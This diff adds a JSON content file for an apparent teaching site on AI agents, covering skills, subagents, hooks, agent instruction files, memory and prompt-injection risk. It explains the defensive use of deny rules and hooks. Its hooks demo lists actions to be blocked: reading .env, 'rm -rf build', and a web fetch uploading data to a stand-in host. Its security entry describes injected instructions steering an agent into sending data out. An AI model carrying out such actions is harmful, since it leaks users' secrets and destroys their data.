+     "title": "Claude Code documentation: how Claude remembers your project",
+     "url": "https://code.claude.com/docs/en/memory"
+    },
+    {
+     "title": "GitHub documentation: repository custom instructions for Copilot",
+     "url": "https://docs.github.com/en/copilot/how-tos/configure-custom-instructions/add-repository-instructions"
+    }
+   ]
+  },
+  {
+   "id": "skills",
+   "group": "files",
+   "name": "Agent Skills (SKILL.md)",
+   "short": "Packaged know-how that loads only when a task needs it.",
+   "plain": "A skill is a binder on a shelf with a clear label on the spine. The agent reads every spine all the time, opens a binder only when the job matches, and turns to an appendix only when the binder says to.",
+   "technical": [
+    "A skill is a folder containing a SKILL.md file: YAML frontmatter followed by Markdown instructions, optionally with scripts/, references/ and assets/ folders.",
+    "Required fields: name, up to 64 characters of lowercase letters, digits and hyphens, matching the folder name; and description, up to 1,024 characters saying what the skill does and when to use it. Optional fields: license, compatibility, metadata and the experimental allowed-tools.",
+    "Progressive disclosure in three levels: name and description load at startup (about 100 tokens per skill); the SKILL.md body loads when the skill is triggered (under 5,000 tokens and 500 lines recommended); bundled files load only when read.",
+    "Scripts run through the shell and only their output enters context, so deterministic work such as validation or conversion costs almost no tokens.",
+    "The description decides when a skill fires: the agent matches the request against it.",
+    "In Claude Code, skills live in ~/.claude/skills/ (personal) or .claude/skills/ (project). On the Claude API they are uploaded and run in the code-execution container without network access. Agent Skills is published as an open specification at agentskills.io.",
+    "A skill is instructions plus code. Anthropic's guidance is to use skills only from trusted sources and to audit every bundled file."
+   ],
+   "matters": "Skills move procedure (how we summarise a contract, how we close the month) out of people's heads and long prompts into versioned, reviewable packages that cost almost nothing until used. Treat third-party skills like third-party software.",
+   "code": [
+    {
+     "lang": "text",
+     "title": "A skill folder",
+     "text": "licence-review/\n├── SKILL.md\n├── scripts/\n│   └── check_licence.py\n└── references/\n    └── LICENCES.md"
+    },
+    {
+     "lang": "markdown",
+     "title": "licence-review/SKILL.md",
+     "text": "---\nname: licence-review\ndescription: Reviews an open-weight model licence against company policy. Use when the user asks whether a model can be used commercially, fine-tuned or redistributed.\n---\n\n# Licence review\n\n1. Identify the licence key from the model card.\n2. Run `scripts/check_licence.py <key>` and report its output verbatim.\n3. For each obligation marked \"confirm\", quote the clause from references/LICENCES.md.",
+     "note": "Example. Only the frontmatter fields name and description are required."
+    }
+   ],
+   "math": [
+    {
+     "label": "Context cost, progressive",
+     "tex": "C = 100\\,N + \\sum_{j \\in A} b_j + \\sum_{f \\in F} |f|",
+     "note": "About 100 tokens of metadata per installed skill (N), the body b_j of each activated skill in A, and only the files F actually read."
+    },
+    {
+     "label": "Context cost, all loaded up front",
+     "tex": "C_{\\text{eager}} = \\sum_{j=1}^{N}\\Big(100 + b_j + \\sum_{f \\in j}|f|\\Big)",
+     "note": "The same library if every skill and every bundled file sat in the prompt."
+    }
+   ],
+   "demo": "skills",
+   "sources": [
+    {
+     "title": "Claude documentation: Agent Skills",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview"
+    },
+    {
+     "title": "Agent Skills specification",
+     "url": "https://agentskills.io/specification"
+    }
+   ]
+  },
+  {
+   "id": "subagents",
+   "group": "files",
+   "name": "Subagents",
+   "short": "Delegated workers with their own context window, tools and model.",
+   "plain": "A manager gives a researcher a brief. The researcher reads fifty documents and only the two-page memo comes back, so the manager's desk stays clear.",
+   "technical": [
+    "In Claude Code a subagent is a Markdown file with YAML frontmatter in .claude/agents/ (project) or ~/.claude/agents/ (user). The body becomes its system prompt.",
+    "Only name and description are required; the description tells the main agent when to delegate. Optional fields include tools (an allow-list), disallowedTools, model, permissionMode, maxTurns, skills, mcpServers, hooks and memory.",
+    "Each subagent runs in its own context window and does not see the main conversation. Only its summary comes back, which keeps verbose work out of the main context.",
+    "Subagents can start their own subagents, up to three levels below the main conversation by default.",
+    "Isolation costs tokens. Anthropic reports that its multi-agent research system used about 15 times the tokens of a chat, against about 4 times for a single agent, and outperformed a single Claude Opus 4 agent by 90.2% on its internal research evaluation."
+   ],
+   "matters": "Subagents are the unit of least privilege inside an agent: a reviewer that can only read, a deployer that can run one command. They are also where token spend multiplies, so reserve them for wide work that justifies the cost.",
+   "code": [
+    {
+     "lang": "markdown",
+     "title": ".claude/agents/code-reviewer.md",
+     "text": "---\nname: code-reviewer\ndescription: Reviews code for quality and best practices\ntools: Read, Glob, Grep\nmodel: sonnet\n---\n\nYou are a code reviewer. When invoked, analyze the code and provide\nspecific, actionable feedback on quality, security, and best practices.",
+     "note": "From the Claude Code documentation. The tools line makes this reviewer read-only."
+    }
+   ],
+   "math": [
+    {
+     "label": "Main context",
+     "tex": "c_{\\text{main}} = c_0 + \\sum_{i=1}^{m} |\\text{summary}_i| \\quad\\text{instead of}\\quad c_0 + \\sum_{i=1}^{m} |\\text{work}_i|",
+     "note": "m delegated tasks: the main agent keeps the summaries, not the work."
+    },
+    {
+     "label": "Total spend",
+     "tex": "\\text{tokens}_{\\text{total}} = \\text{tokens}_{\\text{main}} + \\sum_{i=1}^{m}\\text{tokens}_{i}",
+     "note": "Every subagent pays for its own context. Isolation saves main-context space, not money."
+    }
+   ],
+   "related": [
+    {
+     "label": "Supervisor-worker in the lab",
+     "href": "#/agents/lab/supervisor"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Claude Code documentation: subagents",
+     "url": "https://code.claude.com/docs/en/sub-agents"
+    },
+    {
+     "title": "Anthropic: How we built our multi-agent research system (13 Jun 2025)",
+     "url": "https://www.anthropic.com/engineering/multi-agent-research-system"
+    }
+   ]
+  },
+  {
+   "id": "hooks",
+   "group": "files",
+   "name": "Hooks, permissions and settings",
+   "short": "The deterministic layer: code that runs at fixed points and can block an action.",
+   "plain": "Instructions are a briefing; permissions and hooks are the badge reader on the door. A briefing can be forgotten; a badge reader cannot.",
+   "technical": [
+    "Claude Code settings live in ~/.claude/settings.json (you), .claude/settings.json (project, committed), .claude/settings.local.json (project, not shared) and managed policy settings (organisation, set by administrators).",
+    "Permission rules allow, ask about or deny tools and their arguments. Organisations enforce rules through managed settings such as permissions.deny and sandbox.enabled.",
+    "Hooks are handlers that run on lifecycle events, including SessionStart, UserPromptSubmit, PreToolUse, PermissionRequest, PostToolUse, SubagentStop, PreCompact, Stop and SessionEnd.",
+    "A PreToolUse hook that exits with code 2 blocks the tool call, and its stderr goes to Claude as the reason. It can instead print JSON with permissionDecision set to deny.",
+    "Hooks can also be scoped to a single skill or subagent in its frontmatter.",
+    "Hooks run as ordinary commands with the user's privileges. Review them like any other script in the repository."
+   ],
+   "matters": "This is where policy becomes control. Anything that must never happen, such as deleting outside the workspace, reading secrets or calling unapproved domains, belongs in a deny rule or a hook that is logged and tested, not in a sentence in an instruction file.",
+   "code": [
+    {
+     "lang": "json",
+     "title": ".claude/settings.json: block rm commands before they run",
+     "text": "{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"if\": \"Bash(rm *)\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/block-rm.sh\",\n            \"args\": []\n          }\n        ]\n      }\n    ]\n  }\n}",
+     "note": "From the Claude Code hooks documentation. The script decides and exits with code 2 to block."
+    },
+    {
+     "lang": "json",
+     "title": "Or deny from the hook with JSON (exit code 0)",
+     "text": "{\n  \"hookSpecificOutput\": {\n    \"hookEventName\": \"PreToolUse\",\n    \"permissionDecision\": \"deny\",\n    \"permissionDecisionReason\": \"Destructive command blocked by hook\"\n  }\n}"
+    }
+   ],
+   "math": [],
+   "demo": "hooks",
+   "sources": [
+    {
+     "title": "Claude Code documentation: hooks",
+     "url": "https://code.claude.com/docs/en/hooks"
+    },
+    {
+     "title": "Claude Code documentation: how Claude remembers your project",
+     "url": "https://code.claude.com/docs/en/memory"
+    },
+    {
+     "title": "OWASP LLM06:2025 Excessive Agency",
+     "url": "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
+    }
+   ]
+  },
+  {
+   "id": "family",
+   "group": "files",
+   "name": "The wider family of agent files",
+   "short": "Which file each tool reads, when, and whether anything enforces it.",
+   "plain": "The files come in two kinds: those that brief the model, which are advisory, and those that configure the harness, which are enforced. Mixing the two up is the most common governance mistake.",
+   "technical": [
+    "Briefing files (CLAUDE.md, AGENTS.md, GEMINI.md, Copilot and Cursor instructions, SKILL.md) are text the model reads. They shape behaviour but guarantee nothing.",
+    "Configuration files (settings, subagent definitions, MCP server lists) are read by the harness. They decide which tools exist, which model runs and what is blocked.",
+    "Most tools now read AGENTS.md alongside or instead of their own file, so one shared file plus thin vendor imports is a workable standard.",
+    "Files written by the agent itself, such as Claude Code's MEMORY.md, need the same review as files people write, because they steer the next session."
+   ],
+   "matters": "For each agent in production, list which of these files it reads and who may change them. Review changes to them in pull requests like code, and route anything that must be guaranteed into the enforced kind.",
+   "code": [],
+   "table": {
+    "columns": [
+     "File",
+     "Read by",
+     "Scope",
+     "When it loads",
+     "Kind"
+    ],
+    "rows": [
+     [
+      "CLAUDE.md, .claude/CLAUDE.md",
+      "Claude Code; GitHub Copilot accepts one at the repository root",
+      "Managed, user, project, subdirectory",
+      "Launch, for the working directory and above; subdirectories on demand",
+      "Briefing"
+     ],
+     [
+      "CLAUDE.local.md",
+      "Claude Code",
+      "You, one project, git-ignored",
+      "With CLAUDE.md at the same level",
+      "Briefing"
+     ],
+     [
+      ".claude/rules/*.md",
+      "Claude Code",
+      "Project or user, optionally scoped with paths",
+      "Launch, or when matching files are touched",
+      "Briefing"
+     ],
+     [
+      "MEMORY.md (auto memory)",
+      "Claude Code",
+      "One repository",
+      "First 200 lines or 25KB at launch",
+      "Briefing written by the agent"
+     ],
+     [
+      "AGENTS.md",
+      "Codex, Cursor, Gemini CLI, Copilot coding agent, Jules and others; Claude Code when there is no CLAUDE.md",
+      "Global, project, nested",
+      "Nearest file or concatenated, depending on the tool",
+      "Briefing"
+     ],
+     [
+      "AGENTS.override.md",
+      "Codex",
+      "Global or per directory",
+      "Instead of AGENTS.md in the same directory",
+      "Briefing"
+     ],
+     [
+      "GEMINI.md",
+      "Gemini CLI (name configurable with context.fileName)",
+      "~/.gemini, workspace and parent folders, just in time",
+      "Concatenated into every prompt",
+      "Briefing"
+     ],
+     [
+      ".github/copilot-instructions.md",
+      "GitHub Copilot",
+      "Repository",
+      "Requests in that repository",
+      "Briefing"
+     ],
+     [
+      ".github/instructions/*.instructions.md",
+      "GitHub Copilot",
+      "Files matched by applyTo globs",
+      "When matching files are in scope",
+      "Briefing"
+     ],
+     [
+      ".cursor/rules/*.mdc",
+      "Cursor",
+      "Project; alwaysApply, globs or description",
+      "Always, for matching files, when the agent decides, or on @-mention",
+      "Briefing"
+     ],
+     [
+      "SKILL.md",
+      "Claude Code, Claude API, claude.ai and other Agent Skills clients",
+      "Personal, project or workspace",
+      "Description at startup; body when triggered",
+      "Briefing plus scripts"
+     ],
+     [
+      ".claude/agents/*.md",
+      "Claude Code",
+      "Project or user",
+      "When the main agent delegates",
+      "Configuration: tools, model, permissions"
+     ],
+     [
+      ".claude/settings.json and managed settings",
+      "Claude Code",
+      "User, project, local, organisation",
+      "Always",
+      "Enforced: permissions, hooks, sandbox"
+     ],
+     [
+      "claude_desktop_config.json (mcpServers)",
+      "Claude Desktop",
+      "User",
+      "At start-up",
+      "Configuration: which MCP servers run"
+     ],
+     [
+      "llms.txt",
+      "Agents and tools reading a website",
+      "A website or a path within it",
+      "When an agent fetches it",
+      "Briefing for web content"
+     ]
+    ]
+   },
+   "math": [],
+   "sources": [
+    {
+     "title": "Claude Code documentation: how Claude remembers your project",
+     "url": "https://code.claude.com/docs/en/memory"
+    },
+    {
+     "title": "agents.md",
+     "url": "https://agents.md/"
+    },
+    {
+     "title": "Codex documentation: AGENTS.md",
+     "url": "https://learn.chatgpt.com/docs/agent-configuration/agents-md"
+    },
+    {
+     "title": "Gemini CLI documentation: GEMINI.md",
+     "url": "https://geminicli.com/docs/cli/gemini-md/"
+    },
+    {
+     "title": "GitHub documentation: repository custom instructions for Copilot",
+     "url": "https://docs.github.com/en/copilot/how-tos/configure-custom-instructions/add-repository-instructions"
+    },
+    {
+     "title": "Cursor documentation: rules",
+     "url": "https://cursor.com/docs/context/rules"
+    },
+    {
+     "title": "Claude documentation: Agent Skills",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview"
+    },
+    {
+     "title": "Claude Code documentation: subagents",
+     "url": "https://code.claude.com/docs/en/sub-agents"
+    },
+    {
+     "title": "Claude Code documentation: hooks",
+     "url": "https://code.claude.com/docs/en/hooks"
+    },
+    {
+     "title": "MCP documentation: build an MCP server",
+     "url": "https://modelcontextprotocol.io/docs/develop/build-server"
+    },
+    {
+     "title": "llms.txt proposal, Jeremy Howard (3 Sep 2024)",
+     "url": "https://llmstxt.org/"
+    }
+   ]
+  },
+  {
+   "id": "memory",
+   "group": "operate",
+   "name": "Memory beyond the window",
+   "short": "Working memory is the context. Everything else must be written down and read back.",
+   "plain": "People keep a notebook, a filing system and habits. Agents need the same things made explicit: what to remember, where it is kept and when to look it up.",
+   "technical": [
+    "Working memory is the context window. It is lost when the session ends or is compacted.",
+    "The CoALA framework (Sumers et al.) separates episodic memory (past experiences), semantic memory (facts about the world) and procedural memory (how to act, including the agent's own code and prompts).",
+    "MemGPT (Packer et al.) treats the window like an operating system's main memory, with the model itself moving information between the window and external storage.",
+    "In practice, instruction files and skills hold procedural memory, notes files such as Claude Code's MEMORY.md or a task log hold episodic memory, and retrieval over documents holds semantic memory (see the RAG page).",
+    "Memory the agent writes is untrusted input to the next session: it can carry errors or injected instructions forward. It needs review, expiry and a size limit."
+   ],
+   "matters": "Memory decides what an agent carries between customers, cases and sessions, which makes it a data-protection question: what is stored, for how long, who can read it, and how it is corrected or erased.",
+   "code": [],
+   "math": [],
+   "related": [
+    {
+     "label": "Retrieval (RAG)",
+     "href": "#/rag"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Cognitive Architectures for Language Agents, Sumers et al., 2023 (arXiv 2309.02427)",
+     "url": "https://arxiv.org/abs/2309.02427"
+    },
+    {
+     "title": "MemGPT: Towards LLMs as Operating Systems, Packer et al., 2023 (arXiv 2310.08560)",
+     "url": "https://arxiv.org/abs/2310.08560"
+    },
+    {
+     "title": "Anthropic: Effective context engineering for AI agents (29 Sep 2025)",
+     "url": "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents"
+    },
+    {
+     "title": "Claude Code documentation: how Claude remembers your project",
+     "url": "https://code.claude.com/docs/en/memory"
+    }
+   ]
+  },
+  {
+   "id": "security",
+   "group": "operate",
+   "name": "Security: the lethal trifecta",
+   "short": "Private data, untrusted content and a way out: never all three in one agent.",
+   "plain": "A clerk who can open the safe, reads letters from strangers and can post parcels can be talked into posting the contents of the safe. Take away any one of the three and the scam fails.",
+   "technical": [
+    "Simon Willison's lethal trifecta: access to private data, exposure to untrusted content, and the ability to communicate externally. An agent with all three can be steered by injected instructions into sending data out.",
+    "Prompt injection is untrusted text that the model treats as instructions. It can arrive in a web page, an email, a document, a tool description or a memory file.",
+    "Willison's advice for anyone combining tools is to avoid the combination entirely. Other controls sit outside the model: limit tools, require approval for outbound actions, and log everything.",
+    "The MCP specification requires user consent before tool invocation and says tool annotations are untrusted unless they come from a trusted server. Anthropic's skills guidance is to install skills only from trusted sources.",
+    "OWASP LLM06:2025 Excessive Agency traces the root causes to excessive functionality, excessive permissions and excessive autonomy."
+   ],
+   "matters": "Before an agent goes live, map each of its tools to the three legs. If one agent has all three, split it, remove a capability, or put a person in front of the outbound step.",
+   "code": [],
+   "math": [],
+   "demo": "trifecta",
+   "related": [
+    {
+     "label": "Guardrails in the lab",
+     "href": "#/agents/lab/guardrails"
+    },
+    {
+     "label": "Approval gates in the lab",
+     "href": "#/agents/lab/approval"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Simon Willison: The lethal trifecta for AI agents (16 Jun 2025)",
+     "url": "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"
+    },
+    {
+     "title": "OWASP LLM06:2025 Excessive Agency",
+     "url": "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
+    },
+    {
+     "title": "Model Context Protocol specification, revision 2026-07-28",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28"
+    },
+    {
+     "title": "Claude documentation: Agent Skills",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview"
+    }
+   ]
+  },
+  {
+   "id": "applications",
+   "group": "operate",
+   "name": "The range of agentic applications",
+   "short": "The same loop, very different stakes: what the agent touches sets the risk.",
+   "plain": "Agents differ less in their machinery than in what they touch. The same loop is a coding assistant in one deployment and a customer-facing clerk in another. The risk comes from the tools and the audience.",
+   "technical": [
+    "Autonomy should track reversibility. Where actions are easy to undo and checked by tests, such as code changes in a branch, more autonomy is reasonable. Where they are not, such as payments or messages to customers, keep a person on the step.",
+    "Each application family has a public benchmark. Benchmarks show relative capability on fixed tasks, not readiness for your own processes, which need their own evaluation set.",
+    "Coding and customer support are the two applications Anthropic's Building effective agents singles out as showing particular promise."
+   ],
+   "matters": "Start where actions are reversible and success is checkable. Extend autonomy only as measured reliability (pass^k on your own tasks) and controls justify it.",
+   "code": [],
+   "apps": [
+    {
+     "name": "Coding agents",
+     "what": "Read a repository, edit files, run tests and open pull requests.",
+     "patterns": [
+      "react",
+      "evaluator",
+      "supervisor"
+     ],
+     "benchmarks": [
+      {
+       "title": "SWE-bench, Jimenez et al., 2023 (arXiv 2310.06770)",
+       "url": "https://arxiv.org/abs/2310.06770"
+      }
+     ],
+     "risk": "Unreviewed changes reaching production; secrets in the repository."
+    },
+    {
+     "name": "Computer-use and browser agents",
+     "what": "Operate a desktop or web application through screenshots, clicks and typing.",
+     "patterns": [
+      "react",
+      "approval"
+     ],
+     "benchmarks": [
+      {
+       "title": "OSWorld, Xie et al., 2024 (arXiv 2404.07972)",
+       "url": "https://arxiv.org/abs/2404.07972"
+      },
+      {
+       "title": "WebArena, Zhou et al., 2023 (arXiv 2307.13854)",
+       "url": "https://arxiv.org/abs/2307.13854"
+      }
+     ],
+     "risk": "Prompt injection from pages; clicks that cannot be undone."
+    },
+    {
+     "name": "Research agents",
+     "what": "Search and read many sources, then synthesise a cited report.",
+     "patterns": [
+      "supervisor",
+      "parallel"
+     ],
+     "benchmarks": [
+      {
+       "title": "GAIA, Mialon et al., 2023 (arXiv 2311.12983)",
+       "url": "https://arxiv.org/abs/2311.12983"
+      }
+     ],
+     "risk": "Wrong or mis-cited sources; token cost."
+    },
+    {
+     "name": "Customer-service agents",
+     "what": "Answer and act on customer requests under business policy.",
+     "patterns": [
+      "routing",
+      "tools",
+      "approval"
+     ],
+     "benchmarks": [
+      {
+       "title": "τ-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains, Yao et al., 2024 (arXiv 2406.12045)",
+       "url": "https://arxiv.org/abs/2406.12045"
+      }
+     ],
+     "risk": "Policy breaches; inconsistent answers across runs."
+    },
+    {
+     "name": "Data and analytics agents",
+     "what": "Query databases, run code and chart results.",
+     "patterns": [
+      "plan",
+      "tools"
+     ],
+     "benchmarks": [
+      {
+       "title": "AgentBench, Liu et al., 2023 (arXiv 2308.03688)",
+       "url": "https://arxiv.org/abs/2308.03688"
+      }
+     ],
+     "risk": "Wrong queries presented confidently; access to sensitive tables."
+    },
+    {
+     "name": "Back-office workflow agents",
+     "what": "Route documents, update systems of record and raise approvals.",
+     "patterns": [
+      "chaining",
+      "routing",
+      "guardrails"
+     ],
+     "benchmarks": [],
+     "risk": "Silent errors in records; segregation of duties."
+    },
+    {
+     "name": "Multi-agent systems",
+     "what": "Specialists coordinated by an orchestrator, or peers delegating over A2A.",
+     "patterns": [
+      "supervisor",
+      "multiagent"
+     ],
+     "benchmarks": [],
+     "risk": "Multiplied cost; unclear accountability across agents."
+    }
+   ],
+   "math": [],
+   "sources": [
+    {
+     "title": "Anthropic: Building effective agents (19 Dec 2024)",
+     "url": "https://www.anthropic.com/engineering/building-effective-agents"
+    },
+    {
+     "title": "SWE-bench, Jimenez et al., 2023 (arXiv 2310.06770)",
+     "url": "https://arxiv.org/abs/2310.06770"
+    },
+    {
+     "title": "OSWorld, Xie et al., 2024 (arXiv 2404.07972)",
+     "url": "https://arxiv.org/abs/2404.07972"
+    },
+    {
+     "title": "WebArena, Zhou et al., 2023 (arXiv 2307.13854)",
+     "url": "https://arxiv.org/abs/2307.13854"
+    },
+    {
+     "title": "GAIA, Mialon et al., 2023 (arXiv 2311.12983)",
+     "url": "https://arxiv.org/abs/2311.12983"
+    },
+    {
+     "title": "τ-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains, Yao et al., 2024 (arXiv 2406.12045)",
+     "url": "https://arxiv.org/abs/2406.12045"
+    },
+    {
+     "title": "AgentBench, Liu et al., 2023 (arXiv 2308.03688)",
+     "url": "https://arxiv.org/abs/2308.03688"
+    }
+   ]
+  }
+ ],
+ "loop": {
+  "system": "You select open-weight models for deployment. Use the tools to check the catalog; never state a fact a tool did not return. Size candidates in rank order and stop at the first that fits the memory budget, then confirm its licence.",
+  "noFitTemplate": "No candidate among the first {n} in rank order fits the {budget} GiB budget. Stopping at the step limit set by the harness.",
+  "finalTemplate": "Recommended: {name}. It needs {total} GiB including headroom, within the {budget} GiB budget, and its licence allows commercial use."
+ },
+ "files": {
+  "dirs": [
+   "repo",
+   "repo/services",
+   "repo/services/payments"
+  ],
+  "nodes": [
+   {
+    "id": "userClaude",
+    "path": "~/.claude/CLAUDE.md",
+    "dir": "~/.claude",
+    "name": "CLAUDE.md",
+    "scope": "user",
+    "on": true
+   },
+   {
+    "id": "codexGlobal",
+    "path": "~/.codex/AGENTS.md",
+    "dir": "~/.codex",
+    "name": "AGENTS.md",
+    "scope": "user",
+    "on": true
+   },
+   {
+    "id": "rootClaude",
+    "path": "repo/CLAUDE.md",
+    "dir": "repo",
+    "name": "CLAUDE.md",
+    "scope": "project",
+    "on": true
+   },
+   {
+    "id": "rootLocal",
+    "path": "repo/CLAUDE.local.md",
+    "dir": "repo",
+    "name": "CLAUDE.local.md",
+    "scope": "project",
+    "on": false
+   },
+   {
+    "id": "rootAgents",
+    "path": "repo/AGENTS.md",
+    "dir": "repo",
+    "name": "AGENTS.md",
+    "scope": "project",
+    "on": true
+   },
+   {
+    "id": "payClaude",
+    "path": "repo/services/payments/CLAUDE.md",
+    "dir": "repo/services/payments",
+    "name": "CLAUDE.md",
+    "scope": "project",
+    "on": true
+   },
+   {
+    "id": "payAgents",
+    "path": "repo/services/payments/AGENTS.md",
+    "dir": "repo/services/payments",
+    "name": "AGENTS.md",
+    "scope": "project",
+    "on": true
+   },
+   {
+    "id": "payOverride",
+    "path": "repo/services/payments/AGENTS.override.md",
+    "dir": "repo/services/payments",
+    "name": "AGENTS.override.md",
+    "scope": "project",
+    "on": false
+   }
+  ]
+ },
+ "hooks": {
+  "actions": [
+   {
+    "id": "read",
+    "tool": "Read",
+    "arg": "src/app.ts"
+   },
+   {
+    "id": "test",
+    "tool": "Bash",
+    "arg": "npm test"
+   },
+   {
+    "id": "env",
+    "tool": "Read",
+    "arg": ".env"
+   },
+   {
+    "id": "rm",
+    "tool": "Bash",
+    "arg": "rm -rf build"
+   },
+   {
+    "id": "push",
+    "tool": "Bash",
+    "arg": "git push origin main"
+   },
+   {
+    "id": "fetch",
+    "tool": "WebFetch",
+    "arg": "https://unknown.example/upload?d=…"
+   }
+  ],
+  "controls": [
+   {
+    "id": "instr",
+    "label": "CLAUDE.md line: \"Never read .env and never push to main\"",
+    "kind": "advisory",
+    "covers": [
+     "env",
+     "push"
+    ],
+    "on": true
+   },
+   {
+    "id": "denyEnv",
+    "label": "Deny rule: reading .env",
+    "kind": "deny",
+    "covers": [
+     "env"
+    ],
+    "on": false
+   },
+   {
+    "id": "hookRm",
+    "label": "PreToolUse hook: block rm commands",
+    "kind": "hook",
+    "covers": [
+     "rm"
+    ],
+    "on": false
+   },
+   {
+    "id": "hookPush",
+    "label": "PreToolUse hook: block pushes to main",
+    "kind": "hook",
+    "covers": [
+     "push"
+    ],
+    "on": false
+   },
+   {
+    "id": "askWeb",
+    "label": "Ask rule: every web fetch",
+    "kind": "ask",
+    "covers": [
+     "fetch"
+    ],
+    "on": false
+   }
+  ]
+ },
+ "trifecta": {
+  "capabilities": [
+   {
+    "id": "crm",
+    "label": "Read customer records",
+    "legs": [
+     "private"
+    ],
+    "on": true
+   },
+   {
+    "id": "docs",
+    "label": "Search internal documents",
+    "legs": [
+     "private"
+    ],
+    "on": false
+   },
+   {
+    "id": "inbox",
+    "label": "Read inbound customer email",
+    "legs": [
+     "untrusted"
+    ],
+    "on": true
+   },
+   {
+    "id": "web",
+    "label": "Fetch any web page",
+    "legs": [
+     "untrusted",
+     "external"
+    ],
+    "on": false
+   },
+   {
+    "id": "email",
+    "label": "Send email",
+    "legs": [
+     "external"
+    ],
+    "on": true
+   },
+   {
+    "id": "ticket",
+    "label": "Update an internal support ticket",
+    "legs": [],
+    "on": true
+   }
+  ]
+ },
+ "mcp": {
+  "messages": [
+   {
+    "dir": "out",
+    "label": "tools/list",
+    "note": "The client asks which tools the server offers. Every request carries the protocol version and client capabilities in _meta; the spec's own examples omit them for brevity, as here.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"tools/list\",\n  \"params\": {}\n}"
+   },
+   {
+    "dir": "in",
+    "label": "tools/list result",
+    "note": "Names, descriptions and input schemas. The host adds these to the model's tool definitions. ttlMs and cacheScope say how long the list may be cached.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"resultType\": \"complete\",\n    \"tools\": [\n      {\n        \"name\": \"request_gpu_quota\",\n        \"description\": \"Ask the cloud team for GPU instances\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"instance\": {\n              \"type\": \"string\"\n            },\n            \"count\": {\n              \"type\": \"integer\",\n              \"minimum\": 1\n            }\n          },\n          \"required\": [\n            \"instance\",\n            \"count\"\n          ]\n        }\n      }\n    ],\n    \"ttlMs\": 300000,\n    \"cacheScope\": \"private\"\n  }\n}"
+   },
+   {
+    "dir": "host",
+    "label": "Model chooses a tool",
+    "note": "The model returns a tool request through its own API (function calling). The host checks its policy and asks the user for consent.",
+    "json": "{\n  \"type\": \"tool_use\",\n  \"name\": \"request_gpu_quota\",\n  \"input\": {\n    \"instance\": \"p5.48xlarge\",\n    \"count\": 1\n  }\n}"
+   },
+   {
+    "dir": "out",
+    "label": "tools/call",
+    "note": "The client invokes the tool on the server.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"request_gpu_quota\",\n    \"arguments\": {\n      \"instance\": \"p5.48xlarge\",\n      \"count\": 1\n    }\n  }\n}"
+   },
+   {
+    "dir": "in",
+    "label": "input_required",
+    "note": "The server needs more information, so it returns an elicitation request instead of a result (multi round-trip request). requestState lets it resume without keeping a session.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"resultType\": \"input_required\",\n    \"inputRequests\": {\n      \"cost_centre\": {\n        \"method\": \"elicitation/create\",\n        \"params\": {\n          \"mode\": \"form\",\n          \"message\": \"Which cost centre should this quota be charged to?\",\n          \"requestedSchema\": {\n            \"type\": \"object\",\n            \"properties\": {\n              \"code\": {\n                \"type\": \"string\"\n              }\n            },\n            \"required\": [\n              \"code\"\n            ]\n          }\n        }\n      }\n    },\n    \"requestState\": \"eyJpbnN0YW5jZSI6InA1In0...\"\n  }\n}"
+   },
+   {
+    "dir": "out",
+    "label": "tools/call, retried with the answer",
+    "note": "The host shows the form to a person and retries the request with a new id, the answer and the server's requestState.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"request_gpu_quota\",\n    \"arguments\": {\n      \"instance\": \"p5.48xlarge\",\n      \"count\": 1\n    },\n    \"inputResponses\": {\n      \"cost_centre\": {\n        \"action\": \"accept\",\n        \"content\": {\n          \"code\": \"CC-4410\"\n        }\n      }\n    },\n    \"requestState\": \"eyJpbnN0YW5jZSI6InA1In0...\"\n  }\n}"
+   },
+   {
+    "dir": "in",
+    "label": "Result",
+    "note": "A complete result. The host passes the content back to the model as the tool result.",
+    "json": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"resultType\": \"complete\",\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Quota request QR-1027 raised for 1 × p5.48xlarge, cost centre CC-4410.\"\n      }\n    ],\n    \"isError\": false\n  }\n}"
+   }
+  ]
+ }
+}
